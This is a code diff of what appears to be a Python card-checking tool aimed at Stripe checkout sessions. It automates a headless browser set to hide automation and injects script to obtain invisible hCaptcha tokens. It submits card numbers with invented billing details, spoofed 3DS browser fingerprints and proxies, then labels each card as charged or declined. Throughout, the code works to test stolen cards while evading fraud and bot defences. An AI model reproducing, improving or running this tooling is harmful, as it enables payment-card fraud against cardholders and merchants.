@@ -151,21 +151,11 @@ async def _run_nodriver_hcaptcha(checkout_url, proxy_entry=None, rqdata=None, si
         return None
 
     browser_args = [
-        "--headless=new",
-        "--no-sandbox",
-        "--disable-gpu",
-        "--disable-dev-shm-usage",
-        "--disable-blink-features=AutomationControlled",
-        "--window-size=1920,1080",
-        "--lang=en-US",
-        "--remote-debugging-port=9222",
-        "--disable-extensions",
-        "--disable-background-networking",
-        "--disable-default-apps",
-        "--disable-sync",
-        "--metrics-recording-only",
-        "--mute-audio",
-        "--no-first-run",
+        "--headless=new", "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
+        "--disable-blink-features=AutomationControlled", "--window-size=1920,1080",
+        "--lang=en-US", "--remote-debugging-port=9222", "--disable-extensions",
+        "--disable-background-networking", "--disable-default-apps", "--disable-sync",
+        "--metrics-recording-only", "--mute-audio", "--no-first-run",
     ]
 
     ext_dir = None
@@ -185,45 +175,61 @@ async def _run_nodriver_hcaptcha(checkout_url, proxy_entry=None, rqdata=None, si
     try:
         browser = await _start_browser_with_retry(proxy_entry, browser_args)
         page = await browser.get(checkout_url)
-        await page.sleep(1)
+        await page.sleep(2)
 
         rq_safe = (rqdata or "").replace("\\", "\\\\").replace("'", "\\'")
         sk_safe = sitekey.replace("'", "\\'")
 
         js = f"""
         (async () => {{
-            if (typeof hcaptcha === 'undefined') {{
-                await new Promise((res, rej) => {{
-                    const s = document.createElement('script');
-                    s.src = 'https://js.hcaptcha.com/1/api.js?render=explicit';
-                    s.onload = res;
-                    s.onerror = () => rej('script-load-fail');
-                    document.head.appendChild(s);
+            try {{
+                if (typeof hcaptcha !== 'undefined') {{
+                    let existing = hcaptcha.getResponse();
+                    if (existing) return existing;
+                }}
+                
+                if (typeof hcaptcha === 'undefined') {{
+                    await new Promise((res, rej) => {{
+                        const s = document.createElement('script');
+                        s.src = 'https://js.hcaptcha.com/1/api.js?render=explicit';
+                        s.onload = res;
+                        s.onerror = () => rej('script-load-fail');
+                        document.head.appendChild(s);
+                    }});
+                }}
+                
+                return await new Promise((resolve, reject) => {{
+                    const holder = document.createElement('div');
+                    holder.id = '__hc_holder';
+                    document.body.appendChild(holder);
+                    let done = false;
+                    const t = setTimeout(() => {{ if (!done) {{ done = true; reject('timeout-20s'); }} }}, 20000);
+                    
+                    try {{
+                        const wid = hcaptcha.render(holder, {{
+                            sitekey: '{sk_safe}',
+                            size: 'invisible',
+                            rqdata: '{rq_safe}',
+                            callback: (tok) => {{ if (done) return; done = true; clearTimeout(t); resolve(tok); }},
+                            'error-callback': (e) => {{ if (done) return; done = true; clearTimeout(t); reject('err:' + e); }}
+                        }});
+                        
+                        hcaptcha.execute(wid, {{rqdata: '{rq_safe}'}}).catch(e => {{
+                            if (!done) {{ done = true; clearTimeout(t); reject('exec:' + (e.message || e)); }}
+                        }});
+                    }} catch(e) {{
+                        if (!done) {{ done = true; clearTimeout(t); reject('sync-exec:' + e.message); }}
+                    }}
                 }});
+            }} catch(e) {{
+                return 'global-err: ' + e.message;
             }}
-            return await new Promise((resolve, reject) => {{
-                const holder = document.createElement('div');
-                holder.id = '__hc_holder';
-                document.body.appendChild(holder);
-                let done = false;
-                const t = setTimeout(() => {{ if (!done) reject('timeout-20s'); }}, 20000);
-                const wid = hcaptcha.render(holder, {{
-                    sitekey: '{sk_safe}',
-                    size: 'invisible',
-                    rqdata: '{rq_safe}',
-                    callback: (tok) => {{ if (done) return; done = true; clearTimeout(t); resolve(tok); }},
-                    'error-callback': (e) => {{ if (done) return; done = true; clearTimeout(t); reject('err:' + e); }}
-                }});
-                hcaptcha.execute(wid, {{rqdata: '{rq_safe}'}}).catch(e => {{
-                    if (!done) {{ done = true; clearTimeout(t); reject('exec:' + e); }}
-                }});
-            }});
         }})()
         """
 
         token = await page.evaluate(js, await_promise=True, return_by_value=True)
 
-        if token and isinstance(token, str) and len(token) > 20:
+        if token and isinstance(token, str) and len(token) > 20 and not token.startswith("global-err"):
             log(f"[nodriver] token OK ({len(token)} chars)", C.LIME)
             return token
         log(f"[nodriver] token invalid: {str(token)[:80]}", C.RED)
@@ -248,8 +254,7 @@ async def _run_nodriver_hcaptcha(checkout_url, proxy_entry=None, rqdata=None, si
 async def solve_hcaptcha_selenium(checkout_url, proxy_entry=None, rqdata=None, sitekey=None):
     return await _run_nodriver_hcaptcha(checkout_url, proxy_entry, rqdata, sitekey)
 
-async def solve_hcaptcha(sk, pg, rq, max_attempts=2):
-    return None
+async def solve_hcaptcha(sk, pg, rq, max_attempts=2): return None
 
 _SRC_PREFIXES = ("src_", "tdsrc_", "pi_3ds_")
 def _is_src(v): return isinstance(v, str) and any(v.startswith(p) for p in _SRC_PREFIXES)
@@ -277,20 +282,15 @@ class StripeSession:
         self.url = url.strip()
         self._proxy = proxy_entry
         self.pk = ""; self.cs = ""; self.acct = None
-        self.merchant = "Stripe"
-        self.amount_str = "N/A"; self.raw_amount = 0
+        self.merchant = "Stripe"; self.amount_str = "N/A"; self.raw_amount = 0
         self.session = None; self.email = ""
-        self.init_json = {}
-        self.hcaptcha_sitekey = HCK
+        self.init_json = {}; self.hcaptcha_sitekey = HCK
         self.tracking = {"muid": str(uuid.uuid4()), "sid": str(uuid.uuid4()), "guid": str(uuid.uuid4())}
-        self._current_card = None
-        self._current_pm_id = None
+        self._current_card = None; self._current_pm_id = None
 
     def _proxy_kwargs(self):
         if not self._proxy: return {}
-        kw = {}
-        url = self._proxy["url"]
-        auth = self._proxy.get("auth")
+        kw = {}; url = self._proxy["url"]; auth = self._proxy.get("auth")
         if auth and isinstance(auth, (tuple, list)) and len(auth) == 2:
             url = url.replace("http://", f"http://{auth[0]}:{auth[1]}@")
         kw["proxy"] = url
@@ -298,8 +298,7 @@ class StripeSession:
 
     def _hdrs(self, ref=None):
         h = {
-            "accept": "application/json",
-            "accept-language": "en-US,en;q=0.9",
+            "accept": "application/json", "accept-language": "en-US,en;q=0.9",
             "content-type": "application/x-www-form-urlencoded",
             "origin": "https://checkout.stripe.com",
             "referer": ref or f"https://checkout.stripe.com/c/pay/{self.cs}",
@@ -350,8 +349,7 @@ class StripeSession:
                 r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                     headers=self._hdrs(), data=body)
                 return r.json()
-            except Exception as e:
-                return {"_err": str(e)[:80]}
+            except Exception as e: return {"_err": str(e)[:80]}
         
         tel_task = asyncio.create_task(do_telemetry())
         init_task = asyncio.create_task(do_init())
@@ -359,19 +357,14 @@ class StripeSession:
         
         if not isinstance(j, dict) or "_err" in j:
             return False, j.get("_err", "init failed") if isinstance(j, dict) else "init failed"
-        
         if "error" in j:
-            e = j["error"]
-            return False, f"{e.get('code')}: {e.get('message')}"
+            e = j["error"]; return False, f"{e.get('code')}: {e.get('message')}"
         
         ac = j.get("account_settings") or {}
         self.merchant = ac.get("display_name") or ac.get("business_name") or "Stripe Merchant"
-        cu = j.get("customer") or {}
-        self.email = cu.get("email") or j.get("customer_email") or ""
-        ts = j.get("total_summary") or {}
-        inv = j.get("invoice") or {}
-        lig = j.get("line_item_group") or {}
-        pi = j.get("payment_intent") or {}
+        cu = j.get("customer") or {}; self.email = cu.get("email") or j.get("customer_email") or ""
+        ts = j.get("total_summary") or {}; inv = j.get("invoice") or {}
+        lig = j.get("line_item_group") or {}; pi = j.get("payment_intent") or {}
         self.raw_amount = (ts.get("due") or ts.get("total") or inv.get("amount_due")
                           or inv.get("total") or lig.get("total") or pi.get("amount") or 0)
         curr = (j.get("currency") or "usd").upper()
@@ -382,32 +375,22 @@ class StripeSession:
             passive = j.get("passive_captcha") or {}
             if not passive and isinstance(j.get("account_settings"), dict):
                 passive = j["account_settings"].get("passive_captcha") or {}
-            sk = (passive.get("site_key") or passive.get("sitekey")
-                  or passive.get("key") or j.get("captcha_site_key"))
+            sk = (passive.get("site_key") or passive.get("sitekey") or passive.get("key") or j.get("captcha_site_key"))
             if sk and isinstance(sk, str) and len(sk) > 10:
                 self.hcaptcha_sitekey = sk
-                log(f"sitekey resolved: {sk[:16]}...", C.LIME)
-            else:
-                log(f"sitekey fallback to default", C.YEL)
-        except Exception as e:
-            log(f"sitekey extract err: {e}", C.YEL)
-            
+        except Exception: pass
         return True, None
 
     async def _tokenize(self, card):
         name = random.choice(["James Smith","John Doe","Alex Turner","Michael Brown"])
         email = self.email or f"user{random.randint(1000,99999)}@gmail.com"
         data = {
-            "type": "card",
-            "card[number]": card["cc"], "card[cvc]": card["cvv"],
+            "type": "card", "card[number]": card["cc"], "card[cvc]": card["cvv"],
             "card[exp_month]": card["mm"], "card[exp_year]": card["yy"],
             "billing_details[name]": name, "billing_details[email]": email,
-            "billing_details[address][country]": "US",
-            "billing_details[address][line1]": f"{random.randint(100,9999)} Main St",
-            "billing_details[address][city]": "New York",
-            "billing_details[address][postal_code]": "10001",
-            "billing_details[address][state]": "NY",
-            "payment_user_agent": SJUA,
+            "billing_details[address][country]": "US", "billing_details[address][line1]": f"{random.randint(100,9999)} Main St",
+            "billing_details[address][city]": "New York", "billing_details[address][postal_code]": "10001",
+            "billing_details[address][state]": "NY", "payment_user_agent": SJUA,
             "time_on_page": str(random.randint(45000, 120000)),
             "guid": self.tracking["guid"], "muid": self.tracking["muid"],
             "sid": self.tracking["sid"], "key": self.pk,
@@ -418,20 +401,15 @@ class StripeSession:
             data["client_attribution_metadata[merchant_integration_version]"] = "hosted_checkout"
             data["client_attribution_metadata[payment_method_selection_flow]"] = "automatic"
         try:
-            r = await self.session.post("https://api.stripe.com/v1/payment_methods",
-                data=data, headers=self._hdrs())
+            r = await self.session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=self._hdrs())
             j = r.json()
             if "error" in j:
-                e = j["error"]
-                return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
+                e = j["error"]; return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
             return j.get("id"), None, None
-        except Exception as e:
-            return None, "net", str(e)[:80]
+        except Exception as e: return None, "net", str(e)[:80]
 
     async def _confirm_variants(self, pm_id):
-        total = self.raw_amount
-        checksum = self.init_json.get("init_checksum", "")
-        config_id = self.init_json.get("config_id", "")
+        total = self.raw_amount; checksum = self.init_json.get("init_checksum", ""); config_id = self.init_json.get("config_id", "")
         common = {
             "payment_method": pm_id, "expected_payment_method_type": "card",
             "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
@@ -454,8 +432,7 @@ class StripeSession:
         v = dict(common); v["eid"] = "NA"
         if checksum: v["init_checksum"] = checksum
         variants.append(("V1_NA_checksum", v))
-        v = dict(common); v["eid"] = "NA"
-        variants.append(("V2_NA_nochecksum", v))
+        v = dict(common); v["eid"] = "NA"; variants.append(("V2_NA_nochecksum", v))
         v = dict(common); v["eid"] = str(uuid.uuid4())
         if checksum: v["init_checksum"] = checksum
         variants.append(("V3_UUID_checksum", v))
@@ -463,8 +440,7 @@ class StripeSession:
         last_err = None
         for label, data in variants:
             try:
-                r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
-                    data=data, headers=self._hdrs(), timeout=15)
+                r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs(), timeout=15)
                 j = r.json()
                 if "error" not in j: return j, label
                 msg = j["error"].get("message", "")
@@ -480,36 +456,19 @@ class StripeSession:
             "payment_user_agent": SJUA, "one_click_authn": "false", "challenge_window_size": "05",
             "three_d_secure_2[device_render_options][sdk_interface]": "03",
             "three_d_secure_2[device_render_options][sdk_ui_type][0]": "01",
-            "three_d_secure_2[three_ds_comp_ind]": "Y",
-            "browser[fingerprintAttempted]": "true", "browser[challengeWindowSize]": "05",
-            "browser[threeDSCompInd]": "Y", "browser[browserJavaEnabled]": "false",
-            "browser[browserJavascriptEnabled]": "true", "browser[browserLanguage]": "en-US",
-            "browser[browserColorDepth]": "24", "browser[browserScreenHeight]": "1080",
-            "browser[browserScreenWidth]": "1920", "browser[browserTZ]": "-300",
-            "browser[browserUserAgent]": UA, "browser[browserAcceptHeader]": "text/html,*/*;q=0.8",
+            "three_d_secure_2[three_ds_comp_ind]": "Y", "browser[fingerprintAttempted]": "true",
+            "browser[challengeWindowSize]": "05", "browser[threeDSCompInd]": "Y",
+            "browser[browserJavaEnabled]": "false", "browser[browserJavascriptEnabled]": "true",
+            "browser[browserLanguage]": "en-US", "browser[browserColorDepth]": "24",
+            "browser[browserScreenHeight]": "1080", "browser[browserScreenWidth]": "1920",
+            "browser[browserTZ]": "-300", "browser[browserUserAgent]": UA,
+            "browser[browserAcceptHeader]": "text/html,*/*;q=0.8",
         }
         hdr = {"accept":"application/json","content-type":"application/x-www-form-urlencoded",
                "origin":"https://js.stripe.com","referer":"https://js.stripe.com/",
                "user-agent":UA,"stripe-version":STRIPE_VER}
         try:
-            r = await self.session.post("https://api.stripe.com/v1/3ds2/authenticate",
-                data=data, headers=hdr, timeout=15)
-            return r.json()
-        except Exception as e: return {"error": {"message": str(e)[:80]}}
-
-    async def _confirm_direct(self, pi_id, client_secret, pm_id):
-        endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
-        data = {
-            "key": self.pk, "client_secret": client_secret, "payment_method": pm_id,
-            "payment_method_options[card][request_three_d_secure]": "any",
-            "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}",
-        }
-        hdr = {"accept":"application/json","content-type":"application/x-www-form-urlencoded",
-               "origin":"https://js.stripe.com","referer":"https://js.stripe.com/",
-               "user-agent":UA,"stripe-version":STRIPE_VER}
-        try:
-            r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/confirm",
-                data=data, headers=hdr, timeout=15)
+            r = await self.session.post("https://api.stripe.com/v1/3ds2/authenticate", data=data, headers=hdr, timeout=15)
             return r.json()
         except Exception as e: return {"error": {"message": str(e)[:80]}}
 
@@ -518,28 +477,19 @@ class StripeSession:
         data = {"key": self.pk, "client_secret": client_secret}
         if token: data["captcha_response"] = token
         try:
-            r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge",
-                data=data, headers=self._hdrs(), timeout=15)
+            r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge", data=data, headers=self._hdrs(), timeout=15)
             return r.json()
         except Exception as e: return {"error": {"message": str(e)[:80]}}
 
     async def _handle_waf(self, conf, pi):
         na = pi.get("next_action") or conf.get("next_action") or {}
-        use_sdk = na.get("use_stripe_sdk") or {}
-        sjs = use_sdk.get("stripe_js") or {}
-        pi_id = pi.get("id")
-        cs_secret = pi.get("client_secret")
+        use_sdk = na.get("use_stripe_sdk") or {}; sjs = use_sdk.get("stripe_js") or {}
+        pi_id = pi.get("id"); cs_secret = pi.get("client_secret")
         
-        rqdata = (sjs.get("rqdata")
-                  or conf.get("rqdata")
-                  or (pi.get("next_action", {}).get("use_stripe_sdk", {})
-                      .get("stripe_js", {}).get("rqdata")))
-        site_key = (sjs.get("site_key")
-                    or sjs.get("captcha_site_key")
-                    or getattr(self, "hcaptcha_sitekey", HCK)
-                    or HCK)
-                    
+        rqdata = (sjs.get("rqdata") or conf.get("rqdata") or (pi.get("next_action", {}).get("use_stripe_sdk", {}).get("stripe_js", {}).get("rqdata")))
+        site_key = (sjs.get("site_key") or sjs.get("captcha_site_key") or getattr(self, "hcaptcha_sitekey", HCK) or HCK)
         source = find_source_recursive(conf) or find_source_recursive(pi) or find_source_recursive(use_sdk)
+        
         log(f"WAF -> source={bool(source)} rq={bool(rqdata)}", C.GOLD)
         
         if source:
@@ -601,10 +551,8 @@ class StripeSession:
         return {"success": False, "status": "3DS_OTP", "message": "OTP required"}
     
     async def charge(self, card):
-        res = {"card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}",
-               "status": "ERROR", "message": "", "response_time": 0, "success": False, "merchant": self.merchant, "amount": self.amount_str}
-        t0 = time.time()
-        self._current_card = card
+        res = {"card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}", "status": "ERROR", "message": "", "response_time": 0, "success": False, "merchant": self.merchant, "amount": self.amount_str}
+        t0 = time.time(); self._current_card = card
         try:
             pm_id, code, msg = await self._tokenize(card)
             if not pm_id:
@@ -612,25 +560,25 @@ class StripeSession:
                     res["status"] = "SESSION_EXPIRED"; res["message"] = f"{code}: {msg}"
                 else:
                     res["status"] = "DECLINED"; res["message"] = f"{(code or '').upper()}: {msg}".strip(": ")
-                res["response_time"] = time.time() - t0
-                return res
+                res["response_time"] = time.time() - t0; return res
+            
             self._current_pm_id = pm_id
             conf, variant = await self._confirm_variants(pm_id)
-            res["variant"] = variant
-            res["response_time"] = time.time() - t0
+            res["variant"] = variant; res["response_time"] = time.time() - t0
+            
             err = conf.get("error") or {}
             if err:
                 code = err.get("decline_code") or err.get("code") or ""
                 msg = err.get("message", "")
                 if code in ("resource_missing","checkout_session_expired"):
                     res["status"] = "SESSION_EXPIRED"; res["message"] = f"{code}: {msg}"; return res
-                res["status"] = "DECLINED"; res["message"] = f"{code.upper()}: {msg}".strip(": ")
-                return res
+                res["status"] = "DECLINED"; res["message"] = f"{code.upper()}: {msg}".strip(": "); return res
+            
             pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
             st = pi.get("status") or conf.get("status") or ""
             if st in ("succeeded","requires_capture","complete") or conf.get("payment_status") == "paid":
-                res["status"] = "CHARGED"; res["message"] = "Success"; res["success"] = True
-                return res
+                res["status"] = "CHARGED"; res["message"] = "Success"; res["success"] = True; return res
+            
             if st == "requires_action":
                 na = pi.get("next_action") or {}
                 use_sdk = na.get("use_stripe_sdk") or {}
@@ -647,8 +595,7 @@ class StripeSession:
             res["status"] = st.upper() if st else "UNKNOWN"
             return res
         except Exception as e:
-            res["message"] = f"{type(e).__name__}: {str(e)[:60]}"; res["response_time"] = time.time() - t0
-            return res
+            res["message"] = f"{type(e).__name__}: {str(e)[:60]}"; res["response_time"] = time.time() - t0; return res
     
     async def close(self):
         if self.session: await self.session.close()
